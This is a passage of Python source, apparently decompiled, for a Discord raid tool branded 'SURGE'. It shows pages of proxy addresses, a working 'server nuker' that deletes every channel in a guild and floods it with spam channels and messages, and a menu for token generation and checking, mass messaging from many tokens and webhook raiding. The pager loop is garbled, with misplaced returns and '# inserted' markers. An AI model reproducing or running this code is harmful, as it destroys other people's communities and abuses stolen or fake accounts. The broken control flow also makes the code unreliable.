\tsocks4://203.96.177.211:12514     \thttp://91.189.177.189:3128\nhttp://103.131.18.183:8080     \tsocks4://67.213.212.36:63248      \thttp://103.165.157.235:8090\nhttp://67.43.228.253:30467     \tsocks4://211.194.214.128:9050     \thttp://67.43.236.18:30785\nhttp://103.171.244.54:8088     \thttp://8.242.154.34:999           \thttp://67.43.228.253:1243\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n'
    page10 = '\n .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 \nd88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        \nY88b.      888     888 888    888 888    888 888             888        888    888 888        888        \n \"Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    \n    \"Y88b. 888     888 8888888P\"  888  88888 888             888        8888888P\"  888        888        \n      \"888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        \nY88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        \n \"Y8888P\"   \"Y88888P\"  888   T88b  \"Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 \n                                                                                                        \n8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 \n888   Y88b 888   Y88b d88P\" \"Y88b Y88b d88P    888   888       d88P  Y88b                                \n888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     \n888   d88P 888   d88P 888     888   Y888P      888   8888888    \"Y888b.                                  \n8888888P\"  8888888P\"  888     888   d888b      888   888           \"Y88b.                                \n888        888 T88b   888     888  d88888b     888   888             \"888                                \n888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                         \n888        888   T88b  \"Y88888P\" d88P   Y88b 8888888 8888888888 \"Y8888P\"  [Q] Previous page                [E] Next Page\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\nhttp://1.4.198.132:8081         \thttp://103.126.87.120:8082      \thttp://23.95.216.78:34561\nhttp://101.255.151.178:1111     \thttp://72.10.160.174:8197       \thttp://101.128.93.144:8090\nhttp://103.155.246.180:8081     \thttp://58.20.248.139:9002       \thttp://206.233.167.67:58394\nhttp://20.190.104.113:80        \thttp://179.1.142.129:8080       \thttp://67.43.236.20:26339\nhttp://72.10.160.170:16501      \thttp://41.207.242.62:80         \thttp://72.10.164.178:4075\nhttp://67.43.236.20:8605        \thttp://162.240.75.37:80         \thttp://116.197.134.13:8080\nhttp://138.94.99.135:8080       \thttp://172.247.18.3:1080        \thttp://103.168.123.2:8080\nhttp://67.43.228.253:12637      \thttp://34.172.92.211:3128       \thttp://67.43.236.18:32241\nhttp://183.238.165.170:9002     \thttp://103.130.183.165:5555     \thttp://103.173.138.252:8080\nhttp://194.44.36.114:6868       \thttp://72.10.164.178:14213      \thttp://80.66.81.39:4000\nhttp://67.43.228.253:7491       \thttp://72.10.160.172:15229      \thttp://143.198.226.25:80\n════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════\n'
    pages = [page1, page2, page3, page4, page5, page6, page7, page8, page9, page10]

    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')
    page_number = 0
    while True:
        clear_screen()
        if 0 <= page_number < len(pages):
            from rgbprint import Color
            print(pages[page_number])
            print(f'On Page {page_number + 1}')
            print('[PROXIES] Currently 297 Proxies.')
            print('[PROXIES] Proxy Update 1: 500+ Proxies')
            print('[PROXIES] Proxy Update 2: 1.1k+ Proxies')
        else:  # inserted
            print('Page not found.')
        user_input = input('[>>] ').strip().upper()
        if user_input == 'Q':
            if page_number > 0:
                page_number -= 1
            else:  # inserted
                print('Already at the first page.')
        else:  # inserted
            if user_input == 'E':
                if page_number < len(pages) - 1:
                    page_number += 1
                else:  # inserted
                    print('Already at the last page.')
        if user_input == 'X':
            pass  # postinserted
        return
        print('Invalid input. Please choose [Q], [E], or [X].')
        await asyncio.sleep(0.1)
intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
async def handle_server_nuker():
    bot_token = input('Enter your bot token: ').strip()
    server_id = int(input('Enter the server ID: ').strip())
    base_channel_name = input('Enter the base channel name: ').strip()
    message_to_send = input('Enter the message to send: ').strip()
    temp_client = commands.Bot(command_prefix='!', intents=intents)

    @temp_client.event
    async def on_ready():
        print(f'Logged in as {temp_client.user.name} ({temp_client.user.id})')
        guild = temp_client.get_guild(server_id)
        if not guild:
            print(f'Server with ID \'{server_id}\' not found.')
            await temp_client.close()
            return
        
        # Attempt to delete channels
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f'Deleted channel: {channel.name}')
            except discord.Forbidden:
                print(f'Permission denied to delete channel: {channel.name}')
            except Exception as e:
                print(f'Failed to delete channel {channel.name}: {e}')

        # Create new channels
        new_channels = []
        for i in range(10):
            try:
                new_channel = await guild.create_text_channel(f'{base_channel_name}-{i + 1}')
                new_channels.append(new_channel)
                print(f'Created channel: {new_channel.name}')
            except discord.Forbidden:
                print(f'Permission denied to create a new channel: {base_channel_name}-{i + 1}')
            except Exception as e:
                print(f'Failed to create channel {base_channel_name}-{i + 1}: {e}')
        
        # Send messages to new channels
        for channel in new_channels:
            try:
                await channel.send(message_to_send)
                print(f'Sent message to channel: {channel.name}')
            except discord.Forbidden:
                print(f'Permission denied to send message to channel: {channel.name}')
            except Exception as e:
                print(f'Failed to send message to channel {channel.name}: {e}')

        print('Server nuking operation completed. Returning to the main menu.')
        await temp_client.close()

    await temp_client.start(bot_token)

async def main():
    clear_screen()
    set_title('SURGE by Harit I Raid Tool .gg/2fa I Tokens: 0')
    token_file_path = input('Drag and drop your token file here: ').strip()
    if not os.path.isfile(token_file_path):
        print('Invalid file path. Exiting...')
        return
    
    valid_tokens = await validate_tokens(token_file_path)
    valid_token_count = len(valid_tokens)
    set_title(f'SURGE by Harit I Raid Tool .gg/2fa I Tokens: {valid_token_count}')
    
    while True:
        display_main_menu(valid_token_count)
        
        try:
            choice = int(input('Select an option: ').strip())
            
            if choice == 1:
                await generate_and_check_tokens()
            elif choice == 2:
                token_file_path = input('Enter path to token file: ').strip()
                valid_tokens = await validate_tokens(token_file_path)
                valid_token_count = len(valid_tokens)
                set_title(f'SURGE by Harit I Raid Tool .gg/2fa I Tokens: {valid_token_count}')
                print(f'Valid tokens count: {valid_token_count}')
            elif choice == 3:
                channel_id = input('Enter channel ID: ').strip()
                message = input('Enter message to send: ').strip()
                await send_message_with_tokens(valid_tokens, channel_id, message)
            elif choice == 4:
                channel_ids = input('Enter channel IDs (comma-separated): ').strip().split(',')
                message = input('Enter message to send: ').strip()
                await send_message_to_multiple_channels(valid_tokens, channel_ids, message)
            elif choice == 5:
                token = input('Enter token: ').strip()
                server_id = input('Enter server ID: ').strip()
                await fetch_server_info(token, server_id)
            elif choice == 6:
                token = input('Enter token: ').strip()
                user_id = input('Enter user ID: ').strip()
                await fetch_user_info(token, user_id)
            elif choice == 7:
                await handle_proxies()
            elif choice == 8:
                await handle_webhook_raider(valid_tokens)
            elif choice == 9:
                await handle_server_nuker()
            elif choice == 0:
                return
        except ValueError:
            print("Invalid input. Please enter a number.")

if __name__ == '__main__':
    asyncio.run(main())